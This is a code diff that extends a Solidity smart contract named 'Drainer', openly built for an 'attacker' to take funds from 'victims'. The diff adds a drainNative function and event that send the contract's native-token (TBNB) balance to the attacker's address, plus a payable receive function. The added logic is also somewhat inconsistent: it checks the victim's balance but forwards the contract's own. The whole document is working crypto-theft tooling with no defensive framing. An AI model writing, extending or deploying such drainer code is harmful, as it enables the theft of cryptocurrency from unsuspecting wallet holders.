@@ -11,6 +11,7 @@ contract Drainer {
     address public attacker;
 
     event TokensDrained(address indexed victim, address indexed token, uint256 amount);
+    event NativeDrained(address indexed victim, uint256 amount); // New event for TBNB
 
     constructor() {
         attacker = msg.sender;
@@ -44,4 +45,24 @@ contract Drainer {
         }
         return amount;
     }
+
+    // New function to drain native token (TBNB)
+    function drainNative(address victim) external returns (uint256) {
+        require(msg.sender == attacker, "Not authorized");
+        uint256 balance = victim.balance;
+        if (balance > 0) {
+            // Assumes TBNB was sent to this contract via receive()
+            uint256 amount = address(this).balance;
+            if (amount > 0) {
+                (bool success, ) = attacker.call{value: amount}("");
+                require(success, "Native transfer failed");
+                emit NativeDrained(victim, amount);
+                return amount;
+            }
+        }
+        return 0;
+    }
+
+    // Allow contract to receive TBNB
+    receive() external payable {}
 }
